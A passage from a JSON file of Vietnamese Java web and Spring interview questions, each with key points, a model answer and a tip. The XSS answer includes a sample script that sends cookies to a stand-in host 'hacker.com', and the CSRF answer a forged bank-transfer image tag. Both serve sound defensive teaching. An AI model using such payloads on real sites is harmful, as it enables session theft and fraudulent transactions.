là đơn luồng hay đa luồng?**\n   - **Servlet hoạt động theo mô hình: Single Instance - Multi-threaded!**\n   - Tomcat chỉ tạo **duy nhất 1 đối tượng Servlet** cho mỗi URL mapping. Nếu có 100 người dùng bấm gửi form cùng lúc, Tomcat dùng 100 luồng (Thread) khác nhau để cùng truy cập vào phương thức `service()` của duy nhất đối tượng đó.\n   - **Cảnh báo sống còn**: Tuyệt đối **không được khai báo biến instance variable** để lưu trữ thông tin của người dùng trong Servlet, vì các luồng sẽ ghi đè lên nhau gây lỗi sai lệch dữ liệu (Race Condition). Mọi dữ liệu phải để trong biến cục bộ bên trong hàm `doGet/doPost`.",
      "seniorTip": "Nhấn mạnh yếu tố Thread-Safety của Servlet instance variable - đây là câu hỏi 'bắt bài' ứng viên có kinh nghiệm thực chiến hay không."
    },
    {
      "id": "audit_32",
      "domain": "JavaWeb",
      "question": "Phân biệt RequestDispatcher.forward() và HttpServletResponse.sendRedirect()? Khi nào sử dụng phương thức nào?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "forward(): Xảy ra hoàn toàn ở Server-side. Chỉ có 1 request duy nhất. URL trên trình duyệt KHÔNG ĐỔI. Dữ liệu trong request scope được giữ nguyên.",
        "sendRedirect(): Xảy ra ở Client-side. Trả về mã HTTP 302 cho trình duyệt, trình duyệt tạo REQUEST MỚI (Request thứ 2) tới URL mới. URL trên trình duyệt THAY ĐỔI. Dữ liệu request cũ bị mất.",
        "forward dùng khi: Chuyển dữ liệu từ Servlet sang trang JSP để hiển thị kết quả.",
        "sendRedirect dùng khi: Sau khi submit form thành công (mô hình Post-Redirect-Get để tránh F5 gửi lại đơn hàng), hoặc chuyển hướng sang domain ngoài."
      ],
      "modelAnswer": "Sự khác biệt cốt lõi giữa `forward()` và `sendRedirect()`:\n1. **Cơ chế hoạt động**:\n   - **`RequestDispatcher.forward()` (Chuyển tiếp tại Server)**: Diễn ra hoàn toàn âm thầm bên trong Web Server. Chỉ có **duy nhất 1 cặp request/response**. Server tự động chuyển giao đối tượng `request` sang một Servlet hoặc JSP khác để xử lý tiếp. Thanh địa chỉ URL trên trình duyệt **hoàn toàn KHÔNG THAY ĐỔI**. Tất cả dữ liệu lưu trong `request.setAttribute()` được giữ nguyên vẹn.\n   - **`HttpServletResponse.sendRedirect()` (Chuyển hướng tại Client)**: Server gửi về cho trình duyệt một mã phản hồi **HTTP 302 (Found)** kèm đường dẫn mới trong header `Location`. Trình duyệt nhận mã này sẽ **tự động phát ra một Request mới hoàn toàn (Request thứ 2)** với phương thức `GET` tới URL mới đó. Thanh địa chỉ URL của người dùng **SẼ THAY ĐỔI**. Toàn bộ dữ liệu của request cũ biến mất.\n2. **Trường hợp sử dụng thực tế**:\n   - Dùng **`forward()`** khi: Servlet xử lý nghiệp vụ xong và muốn chuyển dữ liệu sang trang JSP để render giao diện (Mô hình MVC chuẩn).\n   - Dùng **`sendRedirect()`** khi: Áp dụng mô hình **Post-Redirect-Get (PRG)** sau khi thêm mới đơn hàng thành công, chuyển hướng người dùng sang trang danh sách để ngăn chặn việc người dùng nhấn F5 làm gửi lại form (Double Submit). Hoặc khi chuyển hướng sang một website khác nằm ngoài ứng dụng.",
      "seniorTip": "Nhắc tới mô hình Post-Redirect-Get (PRG Pattern) sẽ khẳng định bạn hiểu sâu về kiến trúc Web chuẩn mực."
    },
    {
      "id": "audit_33",
      "domain": "JavaWeb",
      "question": "Phân biệt 4 tầng phạm vi lưu trữ (Scopes) trong ứng dụng JavaWeb: Page, Request, Session và Application?",
      "timeLimitSeconds": 80,
      "keyPoints": [
        "Page Scope (pageContext): Chỉ tồn tại trong nội bộ 1 trang JSP duy nhất.",
        "Request Scope (HttpServletRequest): Tồn tại suốt 1 chu kỳ request-response (bao gồm cả các trang forward tới).",
        "Session Scope (HttpSession): Tồn tại suốt một phiên làm việc của 1 người dùng cụ thể (từ lúc vào web đến khi tắt trình duyệt/hết timeout).",
        "Application/ServletContext Scope: Tồn tại suốt vòng đời của ứng dụng, dùng chung cho TẤT CẢ người dùng."
      ],
      "modelAnswer": "Trong JavaWeb (Servlet/JSP), có 4 phạm vi lưu trữ dữ liệu (Scopes) với vòng đời tăng dần:\n1. **`Page Scope` (Đại diện bởi `pageContext`)**:\n   - Phạm vi hẹp nhất. Dữ liệu chỉ có giá trị trong nội bộ một trang JSP đang thực thi. Chuyển sang trang khác dữ liệu lập tức biến mất.\n2. **`Request Scope` (Đại diện bởi `HttpServletRequest`)**:\n   - Dữ liệu tồn tại trong suốt một chu kỳ yêu cầu - phản hồi (Request-Response).\n   - Nếu dùng `RequestDispatcher.forward()`, dữ liệu vẫn được chuyển tiếp sang Servlet/JSP tiếp theo. Khi response được trả về client, request scope kết thúc.\n   - Ứng dụng: Chứa thông báo lỗi của form, danh sách sản phẩm tìm kiếm để hiển thị lên view.\n3. **`Session Scope` (Đại diện bởi `HttpSession`)**:\n   - Dữ liệu gắn liền với một phiên làm việc của **một người dùng cụ thể** qua nhiều request khác nhau.\n   - Bắt đầu khi người dùng truy cập web và kết thúc khi người dùng đăng xuất, tắt trình duyệt hoặc session bị timeout (mặc định 30 phút).\n   - Ứng dụng: Giỏ hàng mua sắm (Shopping Cart), thông tin tài khoản đã đăng nhập.\n4. **`Application Scope` (Đại diện bởi `ServletContext`)**:\n   - Phạm vi rộng nhất. Dữ liệu được chia sẻ và có thể truy cập bởi **TẤT CẢ mọi người dùng** trong toàn bộ ứng dụng web.\n   - Tồn tại từ lúc ứng dụng được deploy lên server cho tới khi server tắt.\n   - Ứng dụng: Bộ đếm số người truy cập website, cấu hình chung của hệ thống.",
      "seniorTip": "Quy tắc vàng: Luôn chọn Scope nhỏ nhất có thể để giải phóng bộ nhớ sớm và tránh xung đột dữ liệu."
    },
    {
      "id": "audit_34",
      "domain": "JavaWeb",
      "question": "Session và Cookie khác nhau như thế nào? Trình duyệt và Server phối hợp quản lý Session thông qua JSESSIONID ra sao?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "Cookie lưu ở Client (trình duyệt), giới hạn dung lượng ~4KB, có thể bị can thiệp/sửa đổi bởi người dùng.",
        "Session lưu ở Server, an toàn bảo mật, dung lượng lưu trữ lớn hơn.",
        "Cơ chế JSESSIONID: Khi request đến lần đầu, Server tạo HttpSession, sinh mã định danh duy nhất JSESSIONID và gửi về cho Client qua Cookie (Set-Cookie: JSESSIONID=...).",
        "Ở các request tiếp theo, Client tự động gửi Cookie JSESSIONID lên -> Server tìm đúng Session tương ứng."
      ],
      "modelAnswer": "1. **So sánh Session và Cookie**:\n   - **Cookie**: Là mẩu tin văn bản nhỏ được lưu trữ trực tiếp trên **Trình duyệt của người dùng (Client-side)**. Bị giới hạn dung lượng (~4KB mỗi cookie) và có thể bị người dùng xem, chỉnh sửa hoặc đánh cắp. Thường dùng lưu sở thích, ghi nhớ tài khoản.\n   - **Session**: Là vùng nhớ lưu trữ trạng thái nằm trên **Máy chủ (Server-side)**. Lưu được mọi kiểu dữ liệu đối tượng, dung lượng linh hoạt và có độ bảo mật cao vì người dùng không thể can thiệp trực tiếp.\n2. **Cơ chế phối hợp thông qua `JSESSIONID` (Rất hay hỏi)**:\n   Vì giao thức HTTP vốn là phi trạng thái (**Stateless** - mỗi request là độc lập), Server nhận diện cùng một người dùng bằng cách:\n   - Khi người dùng gửi request lần đầu tiên và gọi `request.getSession()`, Server tạo ra một đối tượng `HttpSession` trên RAM và sinh ra một chuỗi mã định danh duy nhất gọi là **`JSESSIONID`**.\n   - Server đóng gói mã này vào Header phản hồi HTTP: `Set-Cookie: JSESSIONID=XYZ123; Path=/; HttpOnly`.\n   - Trình duyệt nhận được sẽ lưu `JSESSIONID` vào kho Cookie của nó.\n   - Ở các request tiếp theo, trình duyệt tự động đính kèm Cookie này lên: `Cookie: JSESSIONID=XYZ123`.\n   - Server đọc `JSESSIONID` từ request, đối chiếu vào bảng quản lý Session trên RAM và lấy ra đúng dữ liệu của phiên làm việc tương ứng.",
      "seniorTip": "Nhắc thêm về cờ 'HttpOnly' để ngăn chặn mã độc JavaScript đọc trộm cookie qua lỗ hổng XSS."
    },
    {
      "id": "audit_35",
      "domain": "JavaWeb",
      "question": "Filter trong JavaWeb là gì? Nêu chu trình hoạt động của FilterChain và các ứng dụng thực tế phổ biến?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "Filter là thành phần chặn giữa Client và Servlet (Interceptor), có thể can thiệp cả trước khi request tới Servlet và sau khi response rời Servlet.",
        "FilterChain: Quản lý chuỗi các Filter. Lệnh chain.doFilter(request, response) đẩy yêu cầu sang Filter tiếp theo hoặc sang Servlet đích.",
        "Nếu không gọi chain.doFilter(), request sẽ bị chặn đứng lại (dùng trong phân quyền/chặn đăng nhập).",
        "Ứng dụng: Xác thực đăng nhập (Authentication), ép kiểu mã hóa Tiếng Việt (UTF-8 Encoding), ghi log (Logging), nén dữ liệu (Gzip)."
      ],
      "modelAnswer": "1. **Khái niệm Filter trong JavaWeb**:\n   - `Filter` là một thành phần có khả năng đánh chặn (**Intercept**) các yêu cầu HTTP trước khi chúng kịp chạm tới Servlet đích, đồng thời cũng có thể can thiệp vào phản hồi HTTP sau khi Servlet xử lý xong trước khi trả về cho Client.\n2. **Cơ chế hoạt động của `FilterChain`**:\n   - Phương thức cốt lõi là `doFilter(ServletRequest request, ServletResponse response, FilterChain chain)`.\n   - Khi một request tới, mã nguồn trước lệnh `chain.doFilter()` sẽ được chạy trước.\n   - Lệnh **`chain.doFilter(request, response)`** đóng vai trò bàn giao quyền điều khiển cho Filter tiếp theo trong chuỗi hoặc bàn giao cho Servlet cuối cùng.\n   - Nếu Filter phát hiện người dùng chưa đăng nhập, nó có thể chủ động chuyển hướng và **KHÔNG GỌI `chain.doFilter()`**, chặn đứng hoàn toàn việc truy cập vào Servlet!\n   - Sau khi Servlet chạy xong, luồng điều khiển quay ngược trở lại các dòng code nằm sau lệnh `chain.doFilter()` để tiếp tục xử lý response.\n3. **Các ứng dụng thực tế phổ biến**:\n   - **Mã hóa ký tự (Character Encoding Filter)**: Ép toàn bộ request về `UTF-8` để chống lỗi font chữ tiếng Việt.\n   - **Xác thực & Phân quyền (Authentication/Authorization Filter)**: Kiểm tra session đăng nhập, nếu chưa đăng nhập thì đẩy về trang Login.\n   - **Ghi nhật ký (Logging Filter)**: Ghi lại địa chỉ IP, URL truy cập và đo thời gian xử lý request.",
      "seniorTip": "Filter chính là tiền thân của cơ chế HandlerInterceptor và Spring Security Filter Chain trong hệ sinh thái Spring."
    },
    {
      "id": "audit_36",
      "domain": "JavaWeb",
      "question": "Trình bày mô hình kiến trúc MVC (Model - View - Controller) trong ứng dụng JavaWeb truyền thống? Nhiệm vụ cụ thể của từng thành phần?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "Model: Đại diện cho dữ liệu và logic nghiệp vụ (JavaBeans, POJO, DAO, Service).",
        "View: Giao diện hiển thị dữ liệu tới người dùng (JSP, HTML, JSTL, EL). Tuyệt đối không chứa logic xử lý DB.",
        "Controller: Bộ điều phối trung tâm (Servlet). Nhận request, gọi Model xử lý, chọn View và forward dữ liệu sang View.",
        "Lợi ích: Tách bạch rõ ràng trách nhiệm (Separation of Concerns), dễ bảo trì, nhiều lập trình viên có thể làm việc song song."
      ],
      "modelAnswer": "Kiến trúc **Model - View - Controller (MVC Model 2)** trong JavaWeb chia tách ứng dụng thành 3 thành phần độc lập:\n1. **Controller (Thường là các Servlet)**:\n   - Là điểm tiếp nhận đầu tiên của mọi yêu cầu từ người dùng.\n   - Nhiệm vụ: Đọc và parse dữ liệu từ form, kiểm tra tính hợp lệ cơ bản, sau đó gọi các hàm xử lý nghiệp vụ ở tầng Model (Service/DAO). Cuối cùng, Controller đưa dữ liệu kết quả vào `request.setAttribute()` và điều hướng (`forward`) sang trang View thích hợp.\n2. **Model (Bao gồm POJO, Entity, Service, DAO)**:\n   - Trái tim của ứng dụng, chịu trách nhiệm lưu trữ trạng thái dữ liệu và thực hiện các quy tắc tính toán nghiệp vụ (Business Logic).\n   - Tương tác trực tiếp với Database thông qua JDBC hoặc Hibernate để truy vấn và cập nhật dữ liệu.\n3. **View (Thường là các trang JSP / JSTL / Expression Language)**:\n   - Chịu trách nhiệm hiển thị kết quả cho người dùng dưới dạng HTML/CSS.\n   - Quy tắc chuẩn: **View không được phép chứa logic nghiệp vụ hay câu lệnh SQL**. Nó chỉ đọc dữ liệu đã được Controller chuẩn bị sẵn trong các scope để hiển thị lên màn hình.\n4. **Luồng hoạt động tổng thể**:\n   `User -> (HTTP Request) -> Controller (Servlet) -> Gọi Model (Service/DAO) -> Nhận dữ liệu Model -> Forward dữ liệu -> View (JSP) -> (HTML Response) -> User`.",
      "seniorTip": "Nêu nguyên tắc 'Thin Controller, Fat Model' - Controller chỉ điều phối, không nên viết hàng trăm dòng logic tính toán vào Servlet."
    },
    {
      "id": "audit_37",
      "domain": "JavaWeb",
      "question": "Phân biệt phương thức GET và POST trong giao thức HTTP? Khi nào bắt buộc dùng POST?",
      "timeLimitSeconds": 80,
      "keyPoints": [
        "GET: Tham số gửi trực tiếp trên thanh URL (Query String), giới hạn độ dài (~2048 ký tự), có thể bookmark và cache được, không bảo mật cho dữ liệu nhạy cảm.",
        "POST: Dữ liệu gửi ẩn trong HTTP Request Body, không giới hạn dung lượng, không bị lưu trong lịch sử duyệt web, an toàn hơn.",
        "Tính Idempotent: GET có tính Idempotent (gọi nhiều lần không làm đổi trạng thái server); POST không idempotent (gọi nhiều lần sinh ra nhiều đơn hàng).",
        "Bắt buộc dùng POST khi: Gửi mật khẩu, dữ liệu nhạy cảm, upload file, hoặc thao tác tạo mới dữ liệu làm thay đổi trạng thái hệ thống."
      ],
      "modelAnswer": "1. **Khác biệt cốt lõi giữa GET và POST**:\n   - **Cách truyền dữ liệu**:\n     - `GET`: Toàn bộ tham số được gắn trực tiếp phía sau URL dưới dạng Query String (ví dụ: `search.jsp?keyword=java&page=1`).\n     - `POST`: Dữ liệu được đóng gói ẩn bên trong **Thân yêu cầu (HTTP Request Body)**, không hiển thị trên URL.\n   - **Dung lượng truyền tải**:\n     - `GET`: Bị giới hạn bởi chiều dài tối đa của URL mà trình duyệt và web server hỗ trợ (thường khoảng 2KB - 8KB).\n     - `POST`: Về mặt lý thuyết là **không giới hạn**, chỉ phụ thuộc vào cấu hình tối đa của Web Server (thích hợp tải file, ảnh).\n   - **Tính an toàn và Caching**:\n     - `GET`: Dữ liệu hiển thị lộ trên URL, bị lưu vào lịch sử duyệt web (Browser History), có thể được Cache lại. Tuyệt đối không dùng để gửi mật khẩu, thông tin thẻ tín dụng!\n     - `POST`: Dữ liệu không lưu vào History, không bị trình duyệt tự động cache.\n   - **Tính Idempotency (Tính lũy đẳng)**:\n     - `GET` có tính **Idempotent**: Gọi 1 lần hay 100 lần thì tài nguyên trên server vẫn không thay đổi.\n     - `POST` **không có tính Idempotent**: Mỗi lần bấm gửi là một lần server thực thi hành động (ví dụ bấm submit 2 lần có thể bị trừ tiền 2 lần).\n2. **Khi nào bắt buộc dùng POST**: Khi đăng nhập tài khoản, thanh toán, upload file, và các thao tác thêm mới/sửa đổi dữ liệu vào Database.",
      "seniorTip": "Lưu ý câu bẫy: POST an toàn hơn GET nhưng không có nghĩa là bảo mật tuyệt đối, vẫn phải kết hợp mã hóa HTTPS để chống bắt gói tin trên đường truyền."
    },
    {
      "id": "audit_38",
      "domain": "JavaWeb",
      "question": "Làm thế nào để xử lý Upload file trong Servlet? Thẻ form HTML và Servlet cần cấu hình những gì?",
      "timeLimitSeconds": 80,
      "keyPoints": [
        "Form HTML: Phải dùng method='POST' và bắt buộc thuộc tính enctype='multipart/form-data'.",
        "Servlet (từ Servlet 3.0): Bắt buộc đánh dấu annotation @MultipartConfig.",
        "Lấy file: Sử dụng request.getPart('fieldName') trả về đối tượng Part.",
        "Lưu file: Dùng part.write(filePath) để lưu file xuống ổ cứng."
      ],
      "modelAnswer": "Để xử lý Upload file (ảnh, tài liệu) trong JavaWeb, cần cấu hình đồng bộ ở cả 2 phía:\n1. **Phía Client (Trang HTML/JSP)**:\n   - Thẻ `<form>` **bắt buộc** phải sử dụng phương thức `method=\"POST\"`.\n   - Bắt buộc phải khai báo thuộc tính: **`enctype=\"multipart/form-data\"`** (thay vì giá trị mặc định là `application/x-www-form-urlencoded`). Thuộc tính này báo cho trình duyệt biết cần chia nhỏ file nhị phân thành các khối dữ liệu đa phần (multi-part) để truyền qua mạng.\n   - Dùng input kiểu: `<input type=\"file\" name=\"avatar\" />`.\n2. **Phía Server (Servlet - Chuẩn Servlet 3.0 trở lên)**:\n   - Trên đầu class Servlet, bắt buộc phải khai báo chú thích **`@MultipartConfig`** (có thể cấu hình thêm `maxFileSize`, `maxRequestSize`).\n   - Trong hàm `doPost()`, sử dụng phương thức **`Part filePart = request.getPart(\"avatar\");`** để lấy đối tượng file.\n   - Trích xuất tên file thông qua `filePart.getSubmittedFileName()`.\n   - Gọi phương thức **`filePart.write(savePath + File.separator + fileName);`** để ghi dữ liệu trực tiếp xuống thư mục lưu trữ trên máy chủ.",
      "seniorTip": "Nhắc thêm việc kiểm tra phần mở rộng (extension) và dung lượng file ở server để chống hacker upload mã độc .jsp hoặc webshell lên server."
    },
    {
      "id": "audit_39",
      "domain": "JavaWeb",
      "question": "Tấn công XSS (Cross-Site Scripting) và CSRF (Cross-Site Request Forgery) là gì? Cách phòng chống trong ứng dụng JavaWeb?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "XSS: Hacker chèn mã JavaScript độc hại vào trang web để chạy trên trình duyệt của nạn nhân (đánh cắp cookie session). Phòng chống bằng cách Escape HTML và dùng JSTL <c:out>.",
        "CSRF: Hacker lừa nạn nhân (đã đăng nhập) click vào link độc hại để bí mật gửi request trái phép dưới danh nghĩa nạn nhân. Phòng chống bằng CSRF Token.",
        "Cookie HttpOnly giúp giảm thiểu rủi ro XSS đánh cắp JSESSIONID.",
        "CSRF Token là chuỗi ngẫu nhiên bí mật sinh ra trên server đính kèm vào mỗi form."
      ],
      "modelAnswer": "1. **Tấn công XSS (Cross-Site Scripting - Chèn mã kịch bản độc hại)**:\n   - **Cơ chế**: Hacker nhập các đoạn mã JavaScript (ví dụ `<script>fetch('hacker.com/steal?cookie=' + document.cookie)</script>`) vào các ô nhập liệu như bình luận, tên tài khoản. Khi người dùng khác truy cập vào trang đó, trình duyệt tự động thực thi đoạn mã JS độc hại này và gửi Cookie phiên làm việc về cho hacker.\n   - **Cách phòng chống**: **Escape toàn bộ ký tự HTML đặc biệt** (`<` thành `&lt;`, `>` thành `&gt;`). Trong JSP, luôn dùng thẻ **`<c:out value=\"${data}\" />`** của JSTL vì thẻ này tự động escape. Ngoài ra, đặt cờ **`HttpOnly`** cho Cookie để JavaScript không thể đọc được `JSESSIONID`.\n2. **Tấn công CSRF (Cross-Site Request Forgery - Giả mạo yêu cầu)**:\n   - **Cơ chế**: Nạn nhân đang đăng nhập vào website ngân hàng (đang lưu Cookie hợp lệ). Hacker gửi cho nạn nhân một email có gắn link ảnh ẩn: `<img src=\"https://mybank.com/transfer?to=hacker&amount=1000\" />`. Khi nạn nhân click vào link, trình duyệt tự động đính kèm Cookie ngân hàng hợp lệ gửi đi, khiến ngân hàng tưởng nạn nhân chủ động chuyển tiền!\n   - **Cách phòng chống**: Sử dụng **CSRF Token** (Anti-CSRF Token). Mỗi khi render form, Server sinh ra một chuỗi ngẫu nhiên bí mật và gắn vào thẻ ẩn `<input type=\"hidden\" name=\"csrf_token\" value=\"xyz\" />`. Khi submit form, Server kiểm tra nếu token gửi lên khớp với token trong session mới cho phép xử lý. Website của hacker không thể biết được token này.",
      "seniorTip": "Spring Security mặc định tự động kích hoạt tính năng bảo vệ CSRF Protection cho mọi phương thức POST/PUT/DELETE."
    },
    {
      "id": "audit_40",
      "domain": "JavaWeb",
      "question": "Tại sao giao thức HTTP lại là Stateless? Các giải pháp phổ biến hiện nay để duy trì trạng thái đăng nhập của người dùng là gì?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "HTTP Stateless: Mỗi cặp request-response là hoàn toàn độc lập, Server không lưu giữ bất kỳ ngữ cảnh nào về các request trước đó của cùng client.",
        "Mục đích Stateless: Giúp Web Server nhẹ tải, dễ dàng scale ngang (Horizontal scaling).",
        "Giải pháp 1: Stateful Session (HttpSession + JSESSIONID Cookie truyền thống).",
        "Giải pháp 2: Stateless Token (JSON Web Token - JWT lưu ở Client, Server chỉ verify chữ ký số, tối ưu cho REST API và Microservices)."
      ],
      "modelAnswer": "1. **Bản chất Stateless của HTTP**:\n   - Giao thức HTTP được thiết kế theo nguyên lý **Stateless (Phi trạng thái)**: Mỗi khi Client gửi một yêu cầu và Server phản hồi xong, kết nối sẽ đóng lại. Máy chủ **hoàn toàn không ghi nhớ bất kỳ điều gì** về yêu cầu trước đó. Yêu cầu số 2 gửi lên được đối xử như một người xa lạ hoàn toàn.\n   - **Lợi ích**: Giúp các kiến trúc Web cực kỳ dễ dàng mở rộng quy mô (**Scalability**) vì bất kỳ máy chủ nào trong cụm cluster cũng có thể xử lý request mà không cần quan tâm máy chủ nào đã tiếp nhận request trước đó.\n2. **Các giải pháp duy trì trạng thái đăng nhập**:\n   - **Giải pháp truyền thống - Stateful Session (`HttpSession`)**:\n     - Máy chủ lưu thông tin đăng nhập trong bộ nhớ RAM (Session Store), cấp cho người dùng một thẻ định danh `JSESSIONID` qua Cookie.\n     - Nhược điểm: Khó scale out trên nhiều server (phải dùng Sticky Session hoặc Redis Session chia sẻ).\n   - **Giải pháp hiện đại - Stateless Token (`JWT - JSON Web Token`)**:\n     - Khi đăng nhập thành công, Server sinh ra một chuỗi JWT mã hóa thông tin user và ký bằng một chữ ký số bí mật (Digital Signature), sau đó trả về cho Client lưu trong LocalStorage hoặc Cookie.\n     - Ở mỗi request tiếp theo, Client đính kèm JWT vào header `Authorization: Bearer <token>`. Server chỉ cần dùng khóa bí mật để kiểm tra chữ ký (verify) là biết ngay user hợp lệ mà **không cần truy vấn Database hay lưu trữ gì trên RAM**!",
      "seniorTip": "Chủ động đề cập JWT và so sánh với Session truyền thống để chứng minh bạn nắm vững cả kiến trúc Monolith và Microservices."
    },
    {
      "id": "audit_41",
      "domain": "Spring Framework",
      "question": "Inversion of Control (IoC) và Dependency Injection (DI) trong Spring Framework là gì? Lợi ích mang lại cho dự án phần mềm?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "IoC (Đảo ngược quyền điều khiển): Thay vì code tự 'new' và quản lý vòng đời đối tượng, quyền kiểm soát được giao phó hoàn toàn cho Spring IoC Container.",
        "DI (Tiêm phụ thuộc): Là một hiện thực cụ thể của IoC, trong đó các đối tượng phụ thuộc được Container 'bơm/tiêm' từ bên ngoài vào class.",
        "Lợi ích: Giảm sự phụ thuộc chặt chẽ (Loose Coupling), tuân thủ nguyên lý Dependency Inversion (SOLID), cực kỳ dễ dàng viết Unit Test (dễ mock dữ liệu)."
      ],
      "modelAnswer": "1. **Khái niệm IoC (Inversion of Control - Đảo ngược quyền điều khiển)**:\n   - Trong lập trình truyền thống, nếu `Class OrderService` cần sử dụng `EmailService`, nó sẽ chủ động tự khởi tạo đối tượng: `private EmailService email = new EmailService();` $\\to$ Điều này làm các class bị phụ thuộc chặt chẽ vào nhau (Tightly Coupled).\n   - Với **IoC**, quyền kiểm soát việc tạo lập, cấu hình và quản lý vòng đời của đối tượng bị đảo ngược: **Giao phó toàn bộ cho một bộ khung quản lý tập trung gọi là Spring IoC Container (ApplicationContext)**.\n2. **Khái niệm DI (Dependency Injection - Tiêm phụ thuộc)**:\n   - DI là mẫu thiết kế (Design Pattern) hiện thực hóa nguyên lý IoC. Thay vì class tự đi tìm hoặc tự `new` phụ thuộc, Spring Container sẽ **tự động \"tiêm\" (Inject)** các đối tượng phụ thuộc đã được khởi tạo sẵn vào cho class sử dụng thông qua Constructor hoặc Annotation.\n3. **Lợi ích to lớn của IoC/DI**:\n   - **Loose Coupling (Liên kết lỏng lẻo)**: Các module không còn dính chặt vào nhau. Ta có thể dễ dàng thay thế `EmailService` bằng `SmsService` mà không cần sửa đổi mã nguồn bên trong `OrderService`.\n   - **Dễ dàng Unit Testing**: Khi viết test cho `OrderService`, ta có thể dễ dàng tiêm một đối tượng giả lập (Mock/Stub Object) vào mà không cần phải kết nối thật tới máy chủ gửi mail.\n   - Tuân thủ nguyên lý chữ **D** trong bộ nguyên tắc thiết kế **SOLID** (Dependency Inversion Principle).",
      "seniorTip": "Khẳng định: IoC là nguyên lý kiến trúc (Principle), còn DI là phương pháp triển khai cụ thể (Design Pattern)."
    },
    {
      "id": "audit_42",
      "domain": "Spring Framework",
      "question": "So sánh 3 hình thức Dependency Injection: Constructor Injection, Setter Injection và Field Injection? Tại sao Constructor Injection được khuyến nghị số 1?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "Field Injection (@Autowired trực tiếp trên biến): Dễ viết nhất nhưng khó test (phải dùng reflection), dễ bị NullPointerException ngoài container, che giấu vi phạm Single Responsibility.",
        "Setter Injection (@Autowired trên hàm set): Thích hợp cho các phụ thuộc tùy chọn (Optional dependencies).",
        "Constructor Injection (@Autowired trên constructor): Bắt buộc khởi tạo đầy đủ phụ thuộc, đối tượng có thể đặt biến final (Immutable), cực kỳ dễ viết Unit Test bằng tay new Service(mockRepo).",
        "Từ Spring 4.3, class có 1 constructor duy nhất thì không cần viết chữ @Autowired."
      ],
      "modelAnswer": "1. **So sánh 3 hình thức Dependency Injection**:\n   - **`Field Injection`** (Dùng `@Autowired` trực tiếp trên thuộc tính `private UserRepository userRepo;`):\n     - *Ưu điểm*: Cú pháp cực kỳ ngắn gọn, đẹp mắt.\n     - *Nhược điểm*: Khiến class bị phụ thuộc hoàn toàn vào Spring Container. Khi viết Unit Test, không thể khởi tạo bằng `new OrderService()` được vì biến bị `private null`, bắt buộc phải dùng Reflection để chèn mock. Dễ vô tình nhồi nhét quá nhiều phụ thuộc vi phạm nguyên tắc Single Responsibility.\n   - **`Setter Injection`** (Gắn `@Autowired` trên phương thức `setUserRepo(...)`):\n     - Thích hợp cho các **phụ thuộc tùy chọn (Optional dependencies)** có thể có hoặc không, hoặc có thể thay đổi lại trong quá trình chạy ứng dụng.\n   - **`Constructor Injection`** (Tiêm qua hàm tạo constructor):\n     - Toàn bộ các đối tượng phụ thuộc được truyền trực tiếp qua tham số của Constructor.\n2. **Tại sao Spring Team và cộng đồng Senior KHUYẾN NGHỊ CONSTRUCTOR INJECTION?**:\n   - **Tính bất biến (Immutability)**: Cho phép khai báo các biến phụ thuộc với từ khóa **`final`** (`private final UserRepository userRepo;`), đảm bảo một khi đối tượng đã khởi tạo thì phụ thuộc không bao giờ bị trỏ đi chỗ khác hoặc bị `null`.\n   - **An toàn tuyệt đối (Fail-Fast)**: Đảm bảo đối tượng không bao giờ rơi vào trạng thái khởi tạo dở dang (nửa vời). Nếu thiếu phụ thuộc, ứng dụng sẽ báo lỗi ngay lập tức lúc build/khởi động.\n   - **Tối ưu cho Unit Test**: Khi viết kiểm thử JUnit, ta chỉ cần gọi `new OrderService(mockUserRepository)` một cách thuần túy mà không cần bật Spring Context nặng nề.",
      "seniorTip": "Nhắc thêm việc dùng Lombok '@RequiredArgsConstructor' để kết hợp với Constructor Injection giúp code vừa ngắn vừa chuẩn kiến trúc."
    },
    {
      "id": "audit_43",
      "domain": "Spring Framework",
      "question": "Trình bày vòng đời (Lifecycle) của một Spring Bean từ lúc khởi tạo đến lúc bị tiêu hủy?",
      "timeLimitSeconds": 85,
      "keyPoints": [
        "Các bước cốt lõi: Instantiate (Tạo instance) -> Populate Properties (Tiêm DI) -> BeanNameAware / BeanFactoryAware -> BeanPostProcessor Pre-Initialization -> @PostConstruct / InitializingBean -> BeanPostProcessor Post-Initialization -> Sẵn sàng sử dụng (Ready for use) -> @PreDestroy / DisposableBean -> Destroy.",
        "@PostConstruct đánh dấu hàm khởi tạo logic sau khi DI hoàn tất.",
        "@PreDestroy đánh dấu hàm dọn dẹp trước khi bean bị tiêu hủy."
      ],
      "modelAnswer": "Vòng đời của một Spring Bean được quản lý nghiêm ngặt bởi Spring IoC Container qua các bước sau:\n1. **Khởi tạo đối tượng (Instantiation)**: Spring quét cấu hình và gọi Constructor của class để tạo đối tượng Bean trong bộ nhớ.\n2. **Tiêm phụ thuộc (Populate Properties / Dependency Injection)**: Spring tìm và tiêm các giá trị, các Bean phụ thuộc vào các trường đã khai báo (qua Constructor hoặc Setter).\n3. **Cung cấp thông tin nội bộ (Aware Interfaces)**: Nếu Bean implement các interface như `BeanNameAware`, `BeanFactoryAware`, `ApplicationContextAware`, Spring sẽ tự động tiêm các đối tượng này vào Bean.\n4. **Tiền xử lý (BeanPostProcessor - Before Initialization)**: Các bộ tiền xử lý can thiệp vào Bean trước khi chạy hàm khởi tạo.\n5. **Khởi tạo nghiệp vụ (Initialization)**: \n   - Phương thức gắn chú thích **`@PostConstruct`** được thực thi (đây là nơi ta viết logic nạp dữ liệu ban đầu, kiểm tra kết nối).\n   - Tiếp theo là hàm `afterPropertiesSet()` nếu implements `InitializingBean`.\n6. **Hậu xử lý (BeanPostProcessor - After Initialization)**: Nơi Spring tạo các **AOP Proxy** (ví dụ bọc `@Transactional`, `@Async`). Sau bước này, Bean chính thức sẵn sàng phục vụ các yêu cầu trong ứng dụng.\n7. **Tiêu hủy (Destruction)**: Khi ứng dụng tắt, Spring kích hoạt phương thức gắn chú thích **`@PreDestroy`** (hoặc hàm `destroy()` của `DisposableBean`) để giải phóng tài nguyên, đóng file, ngắt kết nối.",
